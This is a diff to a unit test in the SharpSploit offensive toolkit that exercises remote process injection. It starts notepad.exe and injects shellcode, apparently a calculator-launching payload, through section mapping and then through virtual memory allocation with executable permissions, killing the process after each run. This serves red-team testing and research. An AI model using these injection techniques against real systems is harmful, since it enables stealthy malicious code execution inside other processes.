@@ -1,6 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
-
+using System.Threading;
 using Microsoft.VisualStudio.TestTools.UnitTesting;
 
 using SharpSploit.Enumeration;
@@ -61,29 +61,49 @@ namespace SharpSploit.Tests.Execution.Injection
                 suspended = false
             };
 
-            SectionMapAlloc allocationTechnique = new SectionMapAlloc
+            SectionMapAlloc secMapAlloc = new SectionMapAlloc
             {
                 localSectionPermissions = Win32.WinNT.PAGE_READWRITE,
                 remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,
                 sectionAttributes = Win32.WinNT.SEC_COMMIT
             };
 
-
             Process notepadProcess = Process.Start("notepad.exe");
 
             // Check the architecture of the process
             PICPayload payload = Host.IsWow64(notepadProcess) ? new PICPayload(calc32bitShellCode) : new PICPayload(calc64bitShellCode);
 
-            IntPtr payloadLocation = allocationTechnique.Allocate(payload, notepadProcess);
+            IntPtr payloadLocation = secMapAlloc.Allocate(payload, notepadProcess);
 
             // For every payload type, both the injectionTechnique and the allocationTechnique would have
             // overloads of Inject() and Allocate() that handle logic relevant to the specific payload type
 
             // Perform injection using the magic of OOP polymorphism and function overloads!
-            Assert.IsTrue(Injector.Inject(payload, allocationTechnique, injectionTechnique, notepadProcess));
+            Assert.IsTrue(Injector.Inject(payload, secMapAlloc, injectionTechnique, notepadProcess));
 
             // If this code were for Process Hollowing, you could use the Allocate function in your Allocation Technique on your new, suspended process. Then overwrite the PEB appropriately.
             // Point being, Techniques like that that rely on complex logic beyond simple primitives would be implemented in separate classes, leveraging the Injection API as useful.
+
+            Thread.Sleep(2000);
+            notepadProcess.Kill();
+
+            // VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+            VirtualAllocate virtAlloc = new VirtualAllocate
+            {
+                allocationType = Win32.Kernel32.AllocationType.Commit | Win32.Kernel32.AllocationType.Reserve,
+                memoryProtection = Win32.Kernel32.MemoryProtection.ExecuteReadWrite,
+                writeAPI = VirtualAllocate.WriteAPIS.NtWriteVirtualMemory,
+                allocAPI = VirtualAllocate.AllocAPIS.NtAllocateVirtualMemory
+            };
+            notepadProcess = Process.Start("notepad.exe");
+            // Check the architecture of the process
+            payload = Host.IsWow64(notepadProcess) ? new PICPayload(calc32bitShellCode) : new PICPayload(calc64bitShellCode);
+            payloadLocation = virtAlloc.Allocate(payload, notepadProcess);
+            // Perform injection using the magic of OOP polymorphism and function overloads!
+            Assert.IsTrue(Injector.Inject(payload, virtAlloc, injectionTechnique, notepadProcess));
+
+            Thread.Sleep(2000);
+            notepadProcess.Kill();
         }
     }
 }
